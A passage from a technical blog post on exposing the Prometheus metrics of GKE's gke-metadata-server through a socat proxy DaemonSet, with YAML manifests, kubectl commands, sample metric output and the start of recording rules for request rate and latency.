</span><span class='line'>      <span class="l-Scalar-Plain">labels</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="l-Scalar-Plain">addonmanager.kubernetes.io/mode</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Reconcile</span>
</span><span class='line'>        <span class="l-Scalar-Plain">k8s-app</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gke-metadata-server</span>
</span><span class='line'>    <span class="l-Scalar-Plain">spec</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">containers</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">command</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">/gke-metadata-server</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">--logtostderr</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">--token-exchange-endpoint=https://securetoken.googleapis.com/v1/identitybindingtoken</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">--identity-namespace=[REDACTED]</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">--identity-provider-id=https://container.googleapis.com/v1/projects/[REDACTED]/locations/europe-west1/clusters/[REDACTED]</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">--passthrough-ksa-list=kube-system:container-watcher-pod-reader,kube-system:event-exporter-sa,kube-system:fluentd-gcp-scaler,kube-system:heapster,kube-system:kube-dns,kube-system:metadata-agent,kube-system:network-metering-agent,kube-system:securityprofile-controller,istio-system:istio-ingressgateway-service-account,istio-system:cluster-local-gateway-service-account,csm:csm-sync-agent,knative-serving:controller</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">--attributes=cluster-name=[REDACTED],cluster-uid=[REDACTED],cluster-location=europe-west1</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">--enable-identity-endpoint=true</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">--cluster-uid=[REDACTED]</span>
</span><span class='line'>        <span class="l-Scalar-Plain">image</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gke.gcr.io/gke-metadata-server:20200218_1145_RC0</span>
</span><span class='line'>        <span class="l-Scalar-Plain">imagePullPolicy</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">IfNotPresent</span>
</span><span class='line'>        <span class="l-Scalar-Plain">livenessProbe</span><span class="p-Indicator">:</span>
</span><span class='line'>          <span class="l-Scalar-Plain">failureThreshold</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">3</span>
</span><span class='line'>          <span class="l-Scalar-Plain">httpGet</span><span class="p-Indicator">:</span>
</span><span class='line'>            <span class="l-Scalar-Plain">host</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">127.0.0.1</span>
</span><span class='line'>            <span class="l-Scalar-Plain">path</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/healthz</span>
</span><span class='line'>            <span class="l-Scalar-Plain">port</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">54898</span>
</span><span class='line'>            <span class="l-Scalar-Plain">scheme</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">HTTP</span>
</span><span class='line'>          <span class="l-Scalar-Plain">initialDelaySeconds</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">10</span>
</span><span class='line'>          <span class="l-Scalar-Plain">periodSeconds</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">10</span>
</span><span class='line'>          <span class="l-Scalar-Plain">successThreshold</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">1</span>
</span><span class='line'>          <span class="l-Scalar-Plain">timeoutSeconds</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">1</span>
</span><span class='line'>        <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gke-metadata-server</span>
</span><span class='line'>        <span class="l-Scalar-Plain">resources</span><span class="p-Indicator">:</span>
</span><span class='line'>          <span class="l-Scalar-Plain">limits</span><span class="p-Indicator">:</span>
</span><span class='line'>            <span class="l-Scalar-Plain">cpu</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">100m</span>
</span><span class='line'>            <span class="l-Scalar-Plain">memory</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">100Mi</span>
</span><span class='line'>          <span class="l-Scalar-Plain">requests</span><span class="p-Indicator">:</span>
</span><span class='line'>            <span class="l-Scalar-Plain">cpu</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">100m</span>
</span><span class='line'>            <span class="l-Scalar-Plain">memory</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">100Mi</span>
</span><span class='line'>        <span class="l-Scalar-Plain">securityContext</span><span class="p-Indicator">:</span>
</span><span class='line'>          <span class="l-Scalar-Plain">privileged</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">true</span>
</span><span class='line'>        <span class="l-Scalar-Plain">terminationMessagePath</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/dev/termination-log</span>
</span><span class='line'>        <span class="l-Scalar-Plain">terminationMessagePolicy</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">File</span>
</span><span class='line'>        <span class="l-Scalar-Plain">volumeMounts</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">mountPath</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/var/lib/kubelet/kubeconfig</span>
</span><span class='line'>          <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">kubelet-credentials</span>
</span><span class='line'>          <span class="l-Scalar-Plain">readOnly</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">true</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">mountPath</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/var/lib/kubelet/pki/</span>
</span><span class='line'>          <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">kubelet-certs</span>
</span><span class='line'>          <span class="l-Scalar-Plain">readOnly</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">true</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">mountPath</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/var/run/</span>
</span><span class='line'>          <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">container-runtime-interface</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">mountPath</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/etc/srv/kubernetes/pki</span>
</span><span class='line'>          <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">kubelet-pki</span>
</span><span class='line'>          <span class="l-Scalar-Plain">readOnly</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">true</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">mountPath</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/etc/ssl/certs/</span>
</span><span class='line'>          <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">ca-certificates</span>
</span><span class='line'>          <span class="l-Scalar-Plain">readOnly</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">true</span>
</span><span class='line'>      <span class="l-Scalar-Plain">dnsPolicy</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Default</span>
</span><span class='line'>      <span class="l-Scalar-Plain">hostNetwork</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">true</span>
</span><span class='line'>      <span class="l-Scalar-Plain">nodeSelector</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="l-Scalar-Plain">beta.kubernetes.io/os</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">linux</span>
</span><span class='line'>        <span class="l-Scalar-Plain">iam.gke.io/gke-metadata-server-enabled</span><span class="p-Indicator">:</span> <span class="s">&quot;true&quot;</span>
</span><span class='line'>      <span class="l-Scalar-Plain">priorityClassName</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">system-node-critical</span>
</span><span class='line'>      <span class="l-Scalar-Plain">restartPolicy</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Always</span>
</span><span class='line'>      <span class="l-Scalar-Plain">schedulerName</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">default-scheduler</span>
</span><span class='line'>      <span class="l-Scalar-Plain">securityContext</span><span class="p-Indicator">:</span> <span class="p-Indicator">{}</span>
</span><span class='line'>      <span class="l-Scalar-Plain">serviceAccount</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gke-metadata-server</span>
</span><span class='line'>      <span class="l-Scalar-Plain">serviceAccountName</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gke-metadata-server</span>
</span><span class='line'>      <span class="l-Scalar-Plain">terminationGracePeriodSeconds</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">30</span>
</span><span class='line'>      <span class="l-Scalar-Plain">tolerations</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">effect</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">NoExecute</span>
</span><span class='line'>        <span class="l-Scalar-Plain">operator</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Exists</span>
</span><span class='line'>      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">effect</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">NoSchedule</span>
</span><span class='line'>        <span class="l-Scalar-Plain">operator</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Exists</span>
</span><span class='line'>      <span class="l-Scalar-Plain">volumes</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">hostPath</span><span class="p-Indicator">:</span>
</span><span class='line'>          <span class="l-Scalar-Plain">path</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/var/lib/kubelet/pki/</span>
</span><span class='line'>          <span class="l-Scalar-Plain">type</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Directory</span>
</span><span class='line'>        <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">kubelet-certs</span>
</span><span class='line'>      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">hostPath</span><span class="p-Indicator">:</span>
</span><span class='line'>          <span class="l-Scalar-Plain">path</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/var/lib/kubelet/kubeconfig</span>
</span><span class='line'>          <span class="l-Scalar-Plain">type</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">File</span>
</span><span class='line'>        <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">kubelet-credentials</span>
</span><span class='line'>      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">hostPath</span><span class="p-Indicator">:</span>
</span><span class='line'>          <span class="l-Scalar-Plain">path</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/var/run/</span>
</span><span class='line'>          <span class="l-Scalar-Plain">type</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Directory</span>
</span><span class='line'>        <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">container-runtime-interface</span>
</span><span class='line'>      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">hostPath</span><span class="p-Indicator">:</span>
</span><span class='line'>          <span class="l-Scalar-Plain">path</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/etc/srv/kubernetes/pki/</span>
</span><span class='line'>          <span class="l-Scalar-Plain">type</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Directory</span>
</span><span class='line'>        <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">kubelet-pki</span>
</span><span class='line'>      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">hostPath</span><span class="p-Indicator">:</span>
</span><span class='line'>          <span class="l-Scalar-Plain">path</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/etc/ssl/certs/</span>
</span><span class='line'>          <span class="l-Scalar-Plain">type</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Directory</span>
</span><span class='line'>        <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">ca-certificates</span>
</span><span class='line'>  <span class="l-Scalar-Plain">templateGeneration</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">7</span>
</span><span class='line'>  <span class="l-Scalar-Plain">updateStrategy</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="l-Scalar-Plain">rollingUpdate</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">maxUnavailable</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">1</span>
</span><span class='line'>    <span class="l-Scalar-Plain">type</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">RollingUpdate</span>
</span></code></pre></td></tr></table></div></figure>


<p>We can run a separate workload on this cluster that uses <a href="https://linux.die.net/man/1/socat"><code>socat</code></a> to proxy HTTP requests to
gke-metadata-server. <code>socat</code> stands for socket cat and is a multipurpose relay. It&rsquo;s <code>netcat</code> on
steroids and can relay any kind of packets not just TCP and UDP.</p>

<p>This proxy is deployed as a DaemonSet to make it easy to have a one-to-one
correspondence with each node-local gke-metadata-server Pod. The DaemonSet will also need to have
<code>.spec.template.spec.hostNetwork: true</code> so that it can share the same network namespace.</p>

<p>Here&rsquo;s the proxy DaemonSet YAML. I use the Docker image <a href="https://hub.docker.com/r/alpine/socat/tags"><code>alpine/socat:1.7.3.4-r0</code></a> which is a
tiny 3.61MB. The arguments <code>["TCP-LISTEN:54899,reuseaddr,fork", "TCP:127.0.0.1:54898"]</code> tell socat
to forward traffic from <code>0.0.0.0:54899</code> to <code>127.0.0.1:54898</code> which is where the Prometheus metrics
are. <code>fork</code> tells socat to</p>

<blockquote><p>After establishing a connection, handles its channel in a child process and keeps the parent
process attempting to produce more connections, either by listening or by connecting in a loop</p></blockquote>

<p>&mdash; <a href="http://www.dest-unreach.org/socat/doc/socat.html#OPTION_FORK">http://www.dest-unreach.org/socat/doc/socat.html#OPTION_FORK</a></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">cat proxy-daemonset.yaml</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">apiVersion</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">apps/v1</span>
</span><span class='line'><span class="l-Scalar-Plain">kind</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">DaemonSet</span>
</span><span class='line'><span class="l-Scalar-Plain">metadata</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gke-metadata-server-metrics-proxy</span>
</span><span class='line'>  <span class="l-Scalar-Plain">namespace</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">monitoring</span>
</span><span class='line'><span class="l-Scalar-Plain">spec</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">selector</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="l-Scalar-Plain">matchLabels</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">app</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gke-metadata-server-metrics-proxy</span>
</span><span class='line'>  <span class="l-Scalar-Plain">template</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="l-Scalar-Plain">metadata</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">labels</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="l-Scalar-Plain">app</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gke-metadata-server-metrics-proxy</span>
</span><span class='line'>    <span class="l-Scalar-Plain">spec</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">hostNetwork</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">true</span>
</span><span class='line'>      <span class="l-Scalar-Plain">containers</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gke-metadata-server-metrics-proxy</span>
</span><span class='line'>        <span class="l-Scalar-Plain">image</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">alpine/socat:1.7.3.4-r0@sha256:6786951b55e321e3968ba1c3786cb79b768f85d83d438f085336442b3bcef67a</span>
</span><span class='line'>        <span class="l-Scalar-Plain">args</span><span class="p-Indicator">:</span> <span class="p-Indicator">[</span><span class="s">&quot;TCP-LISTEN:54899,reuseaddr,fork&quot;</span><span class="p-Indicator">,</span> <span class="s">&quot;TCP:127.0.0.1:54898&quot;</span><span class="p-Indicator">]</span>
</span><span class='line'>        <span class="l-Scalar-Plain">ports</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">prom-metrics</span>
</span><span class='line'>          <span class="l-Scalar-Plain">containerPort</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">54899</span>
</span><span class='line'>          <span class="l-Scalar-Plain">protocol</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">TCP</span>
</span><span class='line'>        <span class="l-Scalar-Plain">livenessProbe</span><span class="p-Indicator">:</span>
</span><span class='line'>          <span class="l-Scalar-Plain">httpGet</span><span class="p-Indicator">:</span>
</span><span class='line'>            <span class="l-Scalar-Plain">host</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">127.0.0.1</span>
</span><span class='line'>            <span class="l-Scalar-Plain">path</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/metricz</span>
</span><span class='line'>            <span class="l-Scalar-Plain">port</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">54899</span>
</span><span class='line'>            <span class="l-Scalar-Plain">scheme</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">HTTP</span>
</span><span class='line'>        <span class="l-Scalar-Plain">resources</span><span class="p-Indicator">:</span>
</span><span class='line'>          <span class="l-Scalar-Plain">limits</span><span class="p-Indicator">:</span>
</span><span class='line'>            <span class="l-Scalar-Plain">cpu</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">100m</span>
</span><span class='line'>            <span class="l-Scalar-Plain">memory</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">100Mi</span>
</span><span class='line'>          <span class="l-Scalar-Plain">requests</span><span class="p-Indicator">:</span>
</span><span class='line'>            <span class="l-Scalar-Plain">cpu</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">100m</span>
</span><span class='line'>            <span class="l-Scalar-Plain">memory</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">100Mi</span>
</span></code></pre></td></tr></table></div></figure>


<p>Apply the DaemonSet.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">kubectl --context [CONTEXT] apply -f proxy-daemonset.yaml</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now make an HTTP request to any GKE node IP at port 54899.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">kubectl --context [CONTEXT] -n monitoring get pods --selector app=gke-metadata-server-metrics-proxy -o wide</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">NAME                                      READY   STATUS    RESTARTS   AGE     IP              NODE                             NOMINATED NODE   READINESS GATES</span>
</span><span class='line'><span class="l-Scalar-Plain">gke-metadata-server-metrics-proxy-dvlpg   1/1     Running   0          4d19h   10.200.208.6    my-cluster-n1-s-32-dfabe6b6-38px   &lt;none&gt;           &lt;none&gt;</span>
</span><span class='line'><span class="l-Scalar-Plain">gke-metadata-server-metrics-proxy-dx4lq   1/1     Running   0          4d19h   10.200.208.8    my-cluster-n1-s-32-dfabe6b6-mnlg   &lt;none&gt;           &lt;none&gt;</span>
</span><span class='line'><span class="l-Scalar-Plain">gke-metadata-server-metrics-proxy-j9p49   1/1     Running   0          4d19h   10.200.208.7    my-cluster-n1-s-32-dfabe6b6-vv9s   &lt;none&gt;           &lt;none&gt;</span>
</span><span class='line'><span class="l-Scalar-Plain">gke-metadata-server-metrics-proxy-jvvjw   1/1     Running   0          4d19h   10.200.208.12   my-cluster-n1-s-32-192fa3d9-wb2c   &lt;none&gt;           &lt;none&gt;</span>
</span><span class='line'><span class="l-Scalar-Plain">gke-metadata-server-metrics-proxy-k5sqd   1/1     Running   0          4d19h   10.200.208.10   my-cluster-n1-s-32-55dd75ff-6l40   &lt;none&gt;           &lt;none&gt;</span>
</span><span class='line'><span class="l-Scalar-Plain">gke-metadata-server-metrics-proxy-tdhkn   1/1     Running   0          4d19h   10.200.208.9    my-cluster-n1-s-32-55dd75ff-jqgk   &lt;none&gt;           &lt;none&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">http GET &#39;10.200.208.6:54899/metricz&#39; | head -n 20</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain"># HELP go_gc_duration_seconds A summary of the GC invocation durations.</span>
</span><span class='line'><span class="l-Scalar-Plain"># TYPE go_gc_duration_seconds summary</span>
</span><span class='line'><span class="l-Scalar-Plain">go_gc_duration_seconds{quantile=&quot;0&quot;} 2.8295e-05</span>
</span><span class='line'><span class="l-Scalar-Plain">go_gc_duration_seconds{quantile=&quot;0.25&quot;} 3.6269e-05</span>
</span><span class='line'><span class="l-Scalar-Plain">go_gc_duration_seconds{quantile=&quot;0.5&quot;} 5.2122e-05</span>
</span><span class='line'><span class="l-Scalar-Plain">go_gc_duration_seconds{quantile=&quot;0.75&quot;} 7.585e-05</span>
</span><span class='line'><span class="l-Scalar-Plain">go_gc_duration_seconds{quantile=&quot;1&quot;} 0.099987877</span>
</span><span class='line'><span class="l-Scalar-Plain">go_gc_duration_seconds_sum 7.738486774</span>
</span><span class='line'><span class="l-Scalar-Plain">go_gc_duration_seconds_count 6809</span>
</span><span class='line'><span class="l-Scalar-Plain"># HELP go_goroutines Number of goroutines that currently exist.</span>
</span><span class='line'><span class="l-Scalar-Plain"># TYPE go_goroutines gauge</span>
</span><span class='line'><span class="l-Scalar-Plain">go_goroutines 47</span>
</span><span class='line'><span class="l-Scalar-Plain"># HELP go_info Information about the Go environment.</span>
</span><span class='line'><span class="l-Scalar-Plain"># TYPE go_info gauge</span>
</span><span class='line'><span class="l-Scalar-Plain">go_info{version=&quot;go1.14rc1&quot;} 1</span>
</span><span class='line'><span class="l-Scalar-Plain"># HELP go_memstats_alloc_bytes Number of bytes allocated and still in use.</span>
</span><span class='line'><span class="l-Scalar-Plain"># TYPE go_memstats_alloc_bytes gauge</span>
</span><span class='line'><span class="l-Scalar-Plain">go_memstats_alloc_bytes 2.4743056e+07</span>
</span><span class='line'><span class="l-Scalar-Plain"># HELP go_memstats_alloc_bytes_total Total number of bytes allocated, even if freed.</span>
</span><span class='line'><span class="l-Scalar-Plain"># TYPE go_memstats_alloc_bytes_total counter</span>
</span></code></pre></td></tr></table></div></figure>


<p>Voila. The important metrics are:</p>

<ul>
<li><code>metadata_server_request_count</code></li>
<li><code>metadata_server_request_durations_bucket</code></li>
</ul>


<p>I have these <a href="https://prometheus.io/docs/prometheus/latest/configuration/recording_rules/#recording-rules">Prometheus recording rules</a> to calculate RPS and request
duration percentiles.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">groups</span><span class="p-Indicator">:</span>
</span><span class='line'><span class="p-Indicator">-</span> <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gke-metadata-server</span>
</span><span class='line'>  <span class="l-Scalar-Plain">rules</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="c1"># Compute a 5-minute rate for the counter `metadata_server_request_count`.</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">metadata_server_request_count:rate5m</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">rate(metadata_server_request_count[5m])</span>
</span><span class='line'>  <span class="c1"># Compute latency percentiles for the histogram metric</span>
</span><span class='line'>  <span class="c1"># `metadata_server_request_durations_bucket` over 5-minute increments for each label</span>
</span><span class='line'>  <span class="c1"># combination.</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">metadata_server_request_duration:p99</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.99, rate(metadata_server_request_durations_bucket[5m]))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">metadata_server_request_duration:p95</span>
